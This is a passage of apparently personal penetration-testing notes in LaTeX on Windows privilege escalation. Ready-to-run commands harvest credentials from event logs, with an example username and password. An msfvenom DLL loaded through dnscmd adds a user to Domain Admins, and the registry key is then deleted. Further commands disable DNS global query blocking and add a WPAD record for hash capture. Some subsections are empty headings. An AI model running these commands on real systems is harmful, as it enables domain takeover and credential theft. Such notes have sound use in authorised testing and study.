\section{Valid accounts}


Valid account anble to abuse some windows privileges. To get a better list of
all the privilges that can be abused check this
\href{https://github.com/gtworek/Priv2Admin/blob/master/README.md}{link}

To enable priviledges, it is possible to use this
\href{https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1}{script}
which is detailed in this
\href{https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/}{blog
post}, as well as
\href{https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77}{this
one} which builds on the initial concept.


\input{windows/pe/at_seimpersonate}
\input{windows/pe/at_sedebug}
\input{windows/pe/at_setakeownership}

\subsection{Abusing Buil-in: Event Log Readers}
Windows events  can be queried from the command line using the
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil}{wevtutil}
utility and the
\href{https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1}{Get-WinEvent} PowerShell cmdlet.

\begin{verbatim}
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 |
    findstr "/user"

# use -Credential to run as 
Get-WinEvent -LogName security |
    where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} |
    Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
\end{verbatim}

\subsection{Abusing Buil-in: DnsAdmin}
 The DNS service runs as \verb+NT AUTHORITY\SYSTEM+, so membership in this
 group could potentially be leveraged to escalate privileges on a Domain
 Controller or in a situation where a separate server is acting as the DNS
 server for the domain.

\subsubsection{DLL injection}
 Check this post \href{https://adsecurity.org/?p=4064}{post}.
he following attack can be performed when DNS is run on a Domain Controller (which is very common):
\begin{itemize}
    \item  DNS management is performed over RPC
    \item
        \href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723}{ServerLevelPluginDll} allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
    \item  When a member of the DnsAdmins group runs the dnscmd command below,
        the
        \verb+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll+ registry key is populated
    \item  When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    \item  An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
\end{itemize}

Only the dnscmd utility can be used by members of the DnsAdmins group, as they
do not directly have permission on the registry key.


\begin{verbatim}
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm 
    /add /domain' -f dll -o adduser.dll

## Loading DLL as Member of DnsAdmins
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

## Confirming Registry Key Added
reg query \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

## Checking Permissions on DNS Service
sc.exe sdshow DNS

## Stopping the DNS Service
 sc stop dns

## Starting the DNS Service
sc start dns

## Confirming Group Membership
net group "Domain Admins" /dom


## Deleting Registry Key
 reg delete \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
\end{verbatim}


As detailed in this
\href{http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html}{post}, 
it is also possible to use
\href{https://github.com/gentilkiwi/mimikatz/tree/master/mimilib}{mimilib.dll}
to gain command execution by modifying the \verb+kdns.c+ file to
execute a reverse shell one-liner or another command of our choosing.

\subsubsection{Creating a WPAD Record}
Another way to abuse DnsAdmins group privileges is by creating a WPAD record.
Membership in this group gives us the rights to
\href{https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps}{disable
global query block security}, which by default blocks this attack. Server 2008
first introduced the ability to add to a global query block list on a DNS
server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and
Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global
query block list. These protocols are quite vulnerable to hijacking, and any
domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every
machine running WPAD with default settings will have its traffic proxied
through the attack machine. Tool such as Responder~\ref{tool:responder} or
Inveigh~\ref{tool:inveigh} to perform traffic spoofing, and attempt to capture
password hashes and crack them offline or perform an SMBRelay attack.

\begin{verbatim}
## Disabling the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

## Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName NAME -ComputerName DNS_FQDN
    -IPv4Address IP
\end{verbatim}

\subsection{Abusing Buil-in: Hyper-V Administrators}
\subsection{Abusing Buil-in: Print Operators}
\subsection{Abusing Buil-in: Server Operators}
\subsection{links}
\begin{itemize}
    \item \url{https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens}
    \item \url{https://securitytimes.medium.com/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa}
    \item \url{https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962}
    \item \url{https://jlajara.gitlab.io/Potatoes_Windows_Privesc}
    \item \url{https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt}
    \item 
    \item \url{https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation}
    \item \url{https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1}
\end{itemize}

